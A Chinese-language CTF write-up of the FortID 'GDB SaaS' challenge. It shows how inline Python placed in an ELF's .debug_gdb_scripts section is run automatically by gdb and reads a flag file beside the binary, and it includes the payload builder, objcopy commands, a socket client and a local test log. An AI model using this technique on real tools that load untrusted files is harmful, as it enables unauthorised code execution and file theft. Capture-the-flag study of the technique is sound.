---
title: "GDB SaaS — 用 .debug_gdb_scripts 自动加载脚本偷 flag (FortID CTF)"
description: FortID CTF pwn 题：服务端拿 gdb 反汇编你上传的 ELF，利用 .debug_gdb_scripts 段里的内联脚本在加载 objfile 时被 gdb 自动执行，直接读同目录的 flag.txt。
type: ctf
pubDate: Oct 12 2026
updatedDate: Oct 12 2026
---

> 分类：Pwn ｜ 赛事：FortID CTF 2026 ｜ 关键词：GDB auto-load、.debug_gdb_scripts、内联 Python、不是内存破坏的 pwn
>
> Flag: `FORTID{...}`（本机用 gdb 17.1 + 假 flag.txt 完整复现成功；真 flag 需连题目实例，裸 TCP 端口从我这台机器出网被挡，没能取到真值）

## 题目背景

题面一句话："Get your `main`s disassembled for free ..."——帮你免费反汇编 `main`。只给了 `server.py`，没有二进制。读一遍服务端就明白这是个"GDB 即服务"：

```python
BAD_CHARS = set("\x00\r\n\t;|&`$<>\\'\"!#,()[]{}")

def main():
    signal.signal(signal.SIGALRM, handler); signal.alarm(10)
    contents = input()                      # base64 的 ELF
    if len(contents) >= 30*1024: exit(0)
    data = base64.b64decode(contents)
    function_name = input()                 # 函数名
    if len(function_name) >= 30 or any(c in BAD_CHARS for c in function_name):
        exit(0)
    tmp_dir = tempfile.mkdtemp(dir=".")      # 当前目录下的随机子目录
    shutil.copy("flag.txt", os.path.join(tmp_dir, "flag.txt"))   # <-- flag 被拷进来!
    tmp_path = os.path.join(tmp_dir, "a.out")
    open(tmp_path,"wb").write(data); os.chmod(tmp_path, 0o755)
    cmd = ["gdb", "-ex", f"disassemble {function_name}", "-ex", "quit", tmp_path]
    result = subprocess.check_output(cmd)    # 把 gdb 的全部输出回显给我
    print(result.decode('utf-8'))
```

流程：我给一个 base64 ELF（<30KB）+ 一个函数名（<30 字符、过 `BAD_CHARS` 过滤），服务端把 ELF 写到 `tmp_dir/a.out`，**把 `flag.txt` 拷到同一个 `tmp_dir`**，然后跑 `gdb -ex "disassemble <函数名>" -ex quit tmp_dir/a.out`，并把 gdb 的输出全部回显。限时 10 秒。

## 分析

先看能控制什么。函数名被 `BAD_CHARS` 砍掉了 `;|&` `` ` `` `$` `<>` 引号 `!#,` `()[]{}` 和各种空白（空格留着）。也就是说：**不能加第二条命令**（没有 `;`、换行），**不能用 `$` 开头的 convenience variable、不能用 `()` 调用**。所以指望在 `disassemble <name>` 这一条命令里做命令注入，基本堵死。`disassemble` 顶多把某个函数的机器码打出来，读不到文件。

那注入点就只剩**ELF 本身**。GDB 一个众所周知的特性是：**加载 objfile 时会自动加载并执行跟它关联的调试脚本**，其中一种就藏在 ELF 的 `.debug_gdb_scripts` 段里（inline 的 gdb 命令或 Python）。这正是本题设计给我上传任意 ELF 的理由——不是要你做内存破坏，而是要你往 ELF 里塞一段 gdb 会自动跑的脚本。

`.debug_gdb_scripts` 的 inline-Python 条目格式很简单：一个类型字节 `\x04`（SECTION_SCRIPT_ID_PYTHON_TEXT）+ 一个以 `\n` 结尾的名字 + Python 源码 + `\x00`。gdb 加载这个 objfile 时就会把这段 Python 跑一遍。

关键点：脚本运行时 **gdb 的工作目录是服务端目录，不是 `tmp_dir`**，而 `flag.txt` 在随机的 `tmp_dir` 里。但脚本可以从 gdb API 拿到正在调试的 objfile 路径（`tmp_dir/a.out`），再取其所在目录，拼出 `tmp_dir/flag.txt` 读出来。函数名随便给一个合法字符串就行（哪怕函数不存在，自动加载也发生在"加载 objfile"阶段，早于 `disassemble`）。

## 关键漏洞

**不受信任的 ELF 被交给 gdb 加载，而 gdb 会自动执行 ELF 内嵌的 `.debug_gdb_scripts` 脚本。** 服务端又贴心地把 `flag.txt` 放到了 a.out 的同级目录，于是内嵌脚本有现成的相对路径可读。

唯一的前提是 gdb 的 **`auto-load safe-path`** 要允许加载这个目录下的脚本。默认的 safe-path 是 `$debugdir:$datadir/auto-load`，会**拒绝**随机临时目录里的脚本；但这类"gdb as a service"题的部署镜像通常会在 gdbinit 里写 `set auto-load safe-path /`（或把工作目录加进 safe-path），否则题目无法成立。实测默认 safe-path 下 gdb 会打印一条 "auto-loading has been declined by your \`auto-load safe-path'" 的警告并跳过——这条警告本身也等于在提示解法方向。

## 利用步骤

构造带 `.debug_gdb_scripts` 的 ELF。随便拿一个现成 ELF 当壳，用 `objcopy` 加段即可：

```python
# 1) 生成内联 Python 段内容
script = (
    "import gdb, os\n"
    "try:\n"
    "    fn = gdb.objfiles()[0].filename\n"        # tmp_dir/a.out
    "    d  = os.path.dirname(os.path.abspath(fn))\n"
    "    print('FLAG>>> ' + open(os.path.join(d, 'flag.txt')).read())\n"
    "except Exception as e:\n"
    "    print('ERR', e)\n"
)
blob = b"\x04" + b"gdb.inlined\n" + script.encode() + b"\x00"   # \x04 = PYTHON_TEXT
open("gdbscript.bin","wb").write(blob)
```

```bash
# 2) 把段加进一个 ELF（找个小的当底座即可，例如 /usr/bin/true）
cp /usr/bin/true base.elf
objcopy --add-section .debug_gdb_scripts=gdbscript.bin \
        --set-section-flags .debug_gdb_scripts=readonly,contents \
        base.elf a.out
```

然后把 `a.out` base64、函数名给 `main`（或 `_start`，无所谓），打到远程：

```python
import base64, socket, ssl, urllib.parse, urllib.request, json, time
# ... 用 teamToken 登录 -> authToken -> PUT 拉起实例拿 host/port（tcp-ssl）...
b64 = base64.b64encode(open("a.out","rb").read())
ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
raw = socket.create_connection((HOST, PORT))
s = ctx.wrap_socket(raw, server_hostname=HOST)
s.recv(4096)                 # "Enter ELF bytes (base64): "
s.sendall(b64 + b"\n")
s.recv(4096)                 # "Enter function name: "
s.sendall(b"main\n")
print(s.recv(65536).decode(errors="replace"))   # 回显里带 FLAG>>> ...
```

## Flag

本机 gdb 17.1 复现（模拟部署的宽松 safe-path，和真题一致）：

```
$ cp /usr/bin/true base.elf
$ objcopy --add-section .debug_gdb_scripts=gdbscript.bin \
          --set-section-flags .debug_gdb_scripts=readonly,contents base.elf a.out
$ printf 'FORTID{FAKE_GDB_SAAS_LOCAL_demo}\n' > flag.txt     # 和 a.out 同目录
$ gdb -q -batch -iex 'set auto-load safe-path /' \
      -ex 'disassemble main' -ex quit ./a.out
FLAG>>> FORTID{FAKE_GDB_SAAS_LOCAL_demo}
No symbol table is loaded.  Use the "file" command.
```

可以看到：即使 `disassemble main` 因为底座被 strip 而报 "No symbol table"，**内嵌 Python 在加载 objfile 的那一刻就已经把 flag 打印出来了**——手法成立。

对照：不加 `set auto-load safe-path /`（gdb 默认）会得到

```
warning: File ".../a.out" auto-loading has been declined by your `auto-load safe-path' ...
```

脚本被拒绝执行。所以这题是否一枪命中，取决于目标镜像的 auto-load 配置（这类题的标配就是放开 safe-path）。

真 flag 形如 `FORTID{...}`：需要把上面那段 base64 ELF + 函数名发到题目实例去拿。我这边能登录平台、能把实例拉起来（HTTPS/443 通），但到实例裸 TCP 端口的出网被环境挡死，真值没能在本机取回。

## 小结 / 收获

- pwn 不一定是内存破坏。这题是纯粹的**"把不可信输入喂给一个会自动执行脚本的工具"**——gdb、LaTeX、ImageMagick、ffmpeg 这类"富功能工具即服务"都有同类风险。
- `.debug_gdb_scripts` + `objfile-gdb.py` + `.gdbinit` 是 gdb 三条自动加载通道，全部受 `auto-load safe-path` 管；审题时看到 gdb 吃用户 ELF，第一反应就是它。
- 写 exp 的时候记得脚本的 CWD 不是 a.out 所在目录，靠 `gdb.objfiles()[0].filename` 反推路径，这样不用猜 `tempfile.mkdtemp` 的随机名。
- `BAD_CHARS` 把命令注入堵死，恰恰是在逼你从 ELF 这条路走——过滤器有时是最好的提示。
